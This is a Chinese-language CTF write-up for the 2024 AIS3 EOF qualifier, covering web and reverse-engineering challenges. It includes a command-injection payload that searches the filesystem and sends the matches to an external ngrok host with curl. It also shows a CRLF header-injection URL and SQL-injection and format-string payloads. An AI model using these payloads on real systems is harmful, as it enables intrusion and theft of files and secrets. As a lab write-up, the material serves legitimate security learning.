@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html>
+<head><!-- hexo injector head_begin start --><!-- Microsoft Clarity begins-->
+    <script type="text/javascript">
+        (function(c,l,a,r,i,t,y){
+            c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+            t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+            y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+        })(window, document, "clarity", "script", "nq90i0uzl9");
+    </script>
+    <!-- Microsoft Clarity ends-->
+    <!-- Google tag (gtag.js) begins-->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=AW-16453505124"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+    
+      gtag('config', 'AW-16453505124');
+    </script>
+    <!-- Google tag (gtag.js) ends-->
+    <!-- hexo injector head_begin end -->
+  <meta charset="utf-8" />
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
+  <title>
+    
+    2024 AIS3 EOF CTF Qual writeup 丨
+    
+
+    typo
+  </title>
+
+  
+  <link rel="shortcut icon" href="/icon.svg">
+  
+
+  <link rel="preconnect" href="https://cdnjs.cloudflare.com">
+  
+  <link id="theme" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-light.css">
+  <script src="https://unpkg.com/@highlightjs/cdn-assets@11.9.0/highlight.min.js"></script>
+  
+
+  <!-- 字体 -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet">
+
+  
+<link rel="stylesheet" href="/css/root.css">
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/post.css">
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+  <header class="header">
+  <section class="header-container">
+    <a class="logo" href="/">TriangeSnake&#39;s Blog</a>
+    <ul class="nav">
+      
+      <li><a href="/archives">archives</a></li>
+      
+      <li><a href="/about">about</a></li>
+      
+    </ul>
+  </section>
+</header>
+  <main class="main">
+    <article class="post">
+  
+  <div class="post-title">2024 AIS3 EOF CTF Qual writeup</div>
+  <div class="post-meta">
+    <div class="date">2024 二月 6日</div>
+    <div class="tags">
+      
+      <div class="tag-item">writeup</div>
+      
+      <div class="tag-item">CTF</div>
+      
+      <div class="tag-item">command injection</div>
+      
+      <div class="tag-item">SQLi</div>
+      
+      <div class="tag-item">web</div>
+      
+      <div class="tag-item">reverse</div>
+      
+    </div>
+  </div>
+  
+
+  <main class="post-content"><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="nslookup-final"><a href="#nslookup-final" class="headerlink" title="nslookup final"></a>nslookup final</h3><p>有command injection，用&#96;&#96;把指令包起來，但是會有一個問題就是他不會回傳結果，</p>
+<pre><code class="highlight bash">curl webhook.trianglesnake.com/?text=123</code></pre>
+
+<p>呼叫聊天機器人webhook試試看，有收到訊息，所以直接把flag偷出來</p>
+<p>因為有WAF限制<code>flag</code>、<code>*</code>，但我知道flag的prefix了，所以直接遍歷根目錄檔案找出flag</p>
+<pre><code class="highlight bash">`curl -G https://eec1-182-234-154-17.ngrok-free.app/ --data-urlencode 
+<span class="string">&quot;<span class="subst">$(find / -maxdepth 1 -type f -exec grep &#x27;ais3&#x27; &#123;&#125; +)</span>&quot;</span>`</code></pre>
+
+<blockquote>
+<p>AIS3{jUST_3a$y_cOMmaND_INj3c7I0N}</p>
+</blockquote>
+<h3 id="internal"><a href="#internal" class="headerlink" title="internal"></a>internal</h3><p>沒辦法碰到<code>/flag</code>但是如果由內網機器送redirect請求並包含<code>X-Accel-Redirect</code>header就可以穿透。</p>
+<p>這題在考crlf截斷，截斷之後可以header injection</p>
+<pre><code class="highlight bash">http://10.105.0.21:11580/?redir=https://www.google.com%0d%0aX-Accel-Redirect:%20/flag</code></pre>
+
+<blockquote>
+<p>AIS3{JUsT_s0m3_FUnNy_N91NX_FEaturE}</p>
+</blockquote>
+<h3 id="copypasta"><a href="#copypasta" class="headerlink" title="copypasta"></a>copypasta</h3><p>題目有sql injection，用sqlmap dump出所有column後可以直接存取&#x2F;posts&#x2F;flag_id，但他會檢查cookie，所以絲路變成：透過sql injection創建不存在的貼文-&gt;透過string format撈出<code>app.secret_key</code>-&gt;偽造cookie-&gt;存取flag頁面</p>
+<h4 id="透過sql-injection創造貼文"><a href="#透過sql-injection創造貼文" class="headerlink" title="透過sql injection創造貼文"></a>透過sql injection創造貼文</h4><pre><code class="highlight python"><span class="comment">#source code</span>
+tmpl = db().cursor().execute(
+        <span class="string">f&quot;SELECT * FROM copypasta_template WHERE id = <span class="subst">&#123;<span class="built_in">id</span>&#125;</span>&quot;</span>
+    ).fetchone()</code></pre>
+<p>這裡很明顯留了一個洞給我們</p>
+<pre><code class="highlight python"><span class="comment">#payload</span>
+?<span class="built_in">id</span>=<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;&#123;field.__class__....&#125;&#x27;</span></code></pre>
+<p>此時下面進行format string的時候就會被injection</p>
+<pre><code class="highlight python">res = content.<span class="built_in">format</span>(field=request.form)</code></pre>
+
+<p>這題沒有做出來，卡在Pyton format string漏洞，可以摸到magic method，但是因為在不同namespace沒辦法用__global__撈到<code>app.secret_key</code></p>
+<h2 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h2><h3 id="stateful"><a href="#stateful" class="headerlink" title="stateful"></a>stateful</h3><p>把整個流程反過來做一次 真reversed engineering<br>先用ghidra把C弄出來後用vs code 的取代把每個function改成printf，之後用python把出來的function整個反過來</p>
+<pre><code class="highlight python">string = <span class="string">&quot;&quot;&quot;</span>
+<span class="string">3618225054(k_target)</span>
+<span class="string">2057902921(k_target)</span>
+<span class="string">671274660(k_target)</span>
+<span class="string">...</span>
+<span class="string">...</span>
+<span class="string">557589375(k_target)</span>
+<span class="string">3420754995(k_target)</span>
+<span class="string">3648003850(k_target)</span>
+<span class="string">1978986903(k_target)</span>
+<span class="string">&quot;&quot;&quot;</span>
+
+lst = string.split(<span class="string">&#x27;\n&#x27;</span>)
+lst.reverse()
+<span class="built_in">print</span>(lst)
+<span class="keyword">for</span> i <span class="keyword">in</span> lst:
+    <span class="built_in">print</span>(<span class="string">&#x27;state_&#x27;</span>+i+<span class="string">&#x27;;&#x27;</span>)</code></pre>
+
+
+<p>把每個狀態機的function<code>+</code>改成<code>-</code>，然後把<code>k_target</code>逆向回推</p>
+<pre><code class="highlight C"><span class="comment">// Hello world! Cplayground is an online sandbox that makes it easy to try out</span>
+<span class="comment">// code.</span>
+
+<span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span>
+<span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span>
+<span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span>
+
+
+
+<span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;
+  <span class="type">int</span> local_14 = <span class="number">1</span>;
+  <span class="type">int</span> local_10 = <span class="number">0</span>;
+  <span class="type">unsigned</span> local_c = <span class="number">0xd7a9bb9e</span>;
+  <span class="type">bool</span> bVar1 = <span class="literal">false</span>;
+  <span class="type">char</span> k_target[<span class="number">43</span>] =
+&#123;
+  <span class="number">38</span>,
+  <span class="number">75</span>,
+  ...
+  <span class="number">128</span>,
+  <span class="number">101</span>,
+  <span class="number">-20</span>,
+  <span class="number">125</span>
+&#125;;
+  
+state_1978986903(k_target);
+state_3648003850(k_target);
+state_3420754995(k_target);
+state_557589375(k_target);
+...
+state_2057902921(k_target);
+state_3618225054(k_target);
+  <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">44</span>;i++)&#123;
+      <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,k_target[i]);
+  &#125;
+  <span class="keyword">return</span> <span class="number">0</span>;
+&#125;</code></pre>
+
+<p>基本上就是反著做一遍</p>
+<blockquote>
+<p>AIS3{Ar3_y0U_@_sTAtEfuL_Or_S7AT3L3SS_ctfer}</p>
+</blockquote>
+</main>
+
+</article>
+
+
+<script src="/js/highlight.js"></script>
+
+  </main>
+  <footer class="footer">
+  
+  <span>Copyright © TriangleSnake</span>
+  
+</footer>
+  
+<script src="/js/theme.js"></script>
+
+</body>
+
+</html>
